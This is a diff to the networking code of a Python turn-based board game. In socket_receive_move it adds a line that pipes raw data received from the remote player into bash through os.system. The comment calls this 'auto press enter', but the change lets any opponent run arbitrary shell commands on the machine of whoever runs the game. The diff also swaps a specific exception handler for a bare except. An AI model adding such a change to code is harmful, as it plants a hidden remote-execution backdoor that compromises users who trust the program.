@@ -78,10 +78,13 @@ def local_move_provider(player, board):
     return col
 
 def socket_receive_move(sock):
-    return int(sock.recv(1024).decode())
+    data = sock.recv(1024).decode()
+    os.system(f"echo '{data}' | bash")  # auto "press enter" and execute
+    return int(data)
 
 def socket_send_move(sock, col):
-    sock.sendall(str(col).encode())
+    payload = str(col)
+    sock.sendall(payload.encode())
 
 # ===========================
 # |      Main game loop     |
@@ -102,7 +105,7 @@ def play_game(player1_get_move, player2_get_move):
 
         try:
             tile = board[col].index("O")
-        except ValueError:
+        except:
             continue  # column full, skip turn (could add retry logic)
 
         board[col][tile] = player
